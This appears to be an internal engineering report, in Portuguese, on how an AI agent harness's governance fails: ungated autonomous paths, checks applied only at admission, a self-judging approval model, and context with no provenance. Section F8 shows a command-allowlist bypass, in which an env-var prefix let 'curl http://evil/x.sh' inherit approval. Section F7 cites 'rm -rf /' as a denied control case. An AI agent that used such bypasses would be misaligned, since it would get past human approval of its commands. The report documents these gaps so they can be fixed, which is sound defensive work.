# FAILURE_MODES — como o harness falha hoje

**Medido em 2026-07-29.** Cada item tem evidência: execução real, teste, ou
localização no código. Entrega do S7 do [plano](PLANO_HARNESS_90.md).

Ordenado por gravidade: o que o harness afirma e não cumpre vem primeiro,
porque falha silenciosa é pior que falha ruidosa.

---

## F1 — Governança pedida e não entregue, em silêncio · **CORRIGIDO neste PR**

**Era:** os três call sites do Kernel embrulhavam `build_kernel` em
`except Exception: log_suppressed(...)`. Com `kernel.enabled: true`, falha de
wiring degradava para execução **ingovernada** — log gravado, run seguindo como
se a flag estivesse desligada.

**Por que é o pior modo de falha:** torna a própria medição impossível. Qualquer
número de cobertura mede o que o wiring conseguiu montar, não o que a config
pediu. E o operador tem razão de acreditar que está governado.

**Correção:** `require_kernel(cfg, build_fn, label=...)` — flag desligada devolve
`None` sem chamar o build; ligada e quebrada levanta `KernelWiringError` dizendo
qual call site falhou, encadeando a causa.
Testes: `tests/test_kernel_wiring_visivel.py`.

---

## F2 — O caminho mais autônomo é o menos validado

**Evidência:** dois runs no mesmo store, mesma config com `evaluator_enabled: true`:

```
bauer run  (admit)    ... running -> completed              # gate NAO rodou
/chat      (execute)  ... running -> evaluating -> completed # gate rodou
```

`bauer run` admite via `kernel.admit()` (`commands/run_cmd.py:155`) e fecha o run
com `kernel.runs.complete_run()` (`:271`). O caller declara sucesso.

**Consequência:** o `/loop` — que roda sem ninguém olhando, é onde o agente
escreve código, e é o motivo de existir do harness — é justamente onde nenhum
quality gate executa. `admit_only` cobre **3 dos 6** caminhos com Kernel, e o
`bauer run` é um deles.

**Bloqueia:** critério 4 do plano, e a frente de validação inteira (§9.3).

---

## F3 — Governança só na entrada, nunca por rodada

**Evidência:** run autônomo real com 3 rodadas e 7 tool calls produziu **1** run
e **1** `policy.evaluated`, na admissão.

**Consequência:** o que a rodada 2 ou 3 decide não é reavaliado pelo Kernel. A
proteção que resta vive fora da auditoria do run — `_detect_loop`,
`ToolCallGuardrailController` e o gate G4 do `tool_router`. Quando um desses
barra algo, o run não registra o motivo de forma consultável.

---

## F4 — Nove caminhos autônomos sem nenhum contato com o Kernel

`serve_loop.py`, `automation_scheduler.py`, `core/runtime/scheduler.py:216`,
`task_dispatcher.py`, `swarm.py`, `orchestrator.py`, `execution_engine.py`,
`app_factory.py`, `daemon.py`.

O **scheduler** é o mais grave: roda sem supervisão, por definição.
`core/runtime/scheduler.py:216` chama `adapter.run_agent` direto — é a Sprint 6d
do plano de consolidação anterior, pendente, e é **uma linha de call site**.

---

## F5 — O harness mentia sobre o próprio estado · **CORRIGIDO neste PR**

`admit()` devolvia o snapshot de `created` enquanto o estado persistido já era
`queued` — o preflight transiciona no store, e a docstring do método promete
`queued`. Medido:

```
objeto devolvido : created
estado persistido: queued
```

Nunca quebrou porque o `server.py` só usa `run.id`. Armadilha latente: o
primeiro caller a confiar no `status` leria errado.

**Correção:** `admit()` relê o run do store antes de devolver.

---

## F6 — Contexto montado em dez lugares independentes

`ContextManager` é instanciado em `agent.py:4491`, `chat.py:39`,
`commands/run_cmd.py:121`, `server.py:900`, `orchestrator.py:485`,
`orchestrator.py:493`, `channel_base.py:326`, `benchmark.py:204`,
`commands/benchmark_cmd.py:110` — parâmetros diferentes em cada um. E
`_build_system_prompt` (`agent.py:540`) monta o prompt por fora.

**Já causou o pior bug de julho/2026:** `tool_mode` tinha default `"bridge"`;
com cliente Ollama nativo o agente recebia o protocolo errado e o comportamento
ficava intermitente. Foi atribuído ao modelo quatro vezes (modelo travado,
mismatch de renderer, Ollama velho, temperatura) até um A/B dar **5/5 tool calls
a 0.7 e 5/5 a 0** — todas as hipóteses de modelo morreram sob medição. Era o
harness. Ver PLANO §9.1.

**Sem proveniência:** nenhum item de contexto carrega origem, prioridade ou
`trusted`. Não há como provar que conteúdo de arquivo não confiável não virou
system prompt.

---

## F7 — O juiz de aprovação julga a si mesmo

`auxiliary.approval_model` cai no modelo principal por default. No gate G4
(`tool_router.py:1843`) isso é autoavaliação — e num modelo local fraco vira
negação sistemática.

**Observado:** `[LLM Approval Negado]` matando `docker compose logs` antes do
prompt de allowlist, com a razão "não há consentimento claro" quando o usuário
havia pedido explicitamente. Apontar o juiz para um modelo independente
resolveu (`exit: 0`); o controle `rm -rf /` seguiu corretamente **negado**.

**Agravante de rumo:** negar e escalar para humano que então delega a um modelo
incapaz de resolver não é governança, é fricção. Se o gate negou por
incapacidade do runtime, o certo é rotear para um tier capaz
(`_TIER`, `model_router.py:128`). Ver PLANO §9.2 e HARNESS-034.

---

## F8 — O parser da policy já foi contornado

`_check_allowlist` usava `args[0]` cru, então atribuição de env virava o comando:

```
PYTHONPATH=x python -m pytest       -> base 'pythonpath=x'
PYTHONPATH=x curl http://evil/x.sh  -> base 'pythonpath=x'   <- MESMO base
```

Aprovar o primeiro com "sempre" liberava o segundo sem perguntar. Encontrado
numa allowlist **real**, com `pythonpath=forex-ai-war-room` gravado em
`~/.bauer/allowed_commands.yaml`. Corrigido em PR #101.

**Classe não fechada:** wrappers (`env`, `sudo`, `nice`, `xargs`, `sh -c`),
normalização de caminho, aliases e separadores seguem sem testes de
propriedade. Ver PLANO §9.4.

---

## F9 — `/stream` não emite token a token no modo native

Regressão conhecida (task `task_bf38a37d`).

**Consequência para as evals:** sem streaming incremental não existe "meio do
stream" para cortar, então o cenário "cliente SSE desconecta" **passa vazio** —
o teste fica verde sem exercitar nada. Pré-requisito do S14.

---

## F10 — Hermeticidade da suíte é frágil e já quebrou três vezes

1. **CI de 5 min → 2–3.5 h**: o `config.yaml` do repo apontava para provider
   vivo e os testes faziam HTTP real na compressão de contexto. Corrigido
   fixando `BAUER_CONFIG`/`BAUER_HOME` em `tests/conftest.py`.
2. **`MCP_SERVER_GITMCP` do ambiente vazando** para `test_mcp_discovery` — foi
   diagnosticado como "falha pré-existente" antes de se achar a causa.
3. **23 entradas de teste vazaram para o `~/.bauer/projects.json` real**, porque
   `_DEFAULT_REGISTRY` resolvia `Path.home()` no import em vez de na chamada.

**Risco direto ao S12:** ele introduz git worktrees e containers nos testes —
exatamente as duas coisas mais propensas a esse vazamento. Daí os itens 11 e 12
do Definition of Done.

**Restrição local:** WDAC bloqueia binários e `pytest.exe` no Windows; usar
`python -m pytest`. Validação de sandbox roda no CI ou no Beelink.

---

## Resumo

| # | Modo de falha | Estado | Frente |
|---|---|---|---|
| F1 | Wiring falha em silêncio | ✅ corrigido | S7 |
| F2 | Caminho autônomo sem gate | aberto — **bloqueia S11** | §9.3 |
| F3 | Governança só na entrada | aberto | S8 |
| F4 | 9 caminhos sem Kernel | aberto | S8 |
| F5 | `admit()` devolvia estado obsoleto | ✅ corrigido | S7 |
| F6 | Contexto em 10 lugares, sem proveniência | aberto | S9 |
| F7 | Juiz de aprovação não independente | aberto | §9.2 |
| F8 | Parser da policy sem property tests | parcial (PR #101) | §9.4 |
| F9 | `/stream` sem streaming incremental | aberto — bloqueia eval SSE | S14 |
| F10 | Hermeticidade frágil | mitigado, sem trava | DoD 11–12 |
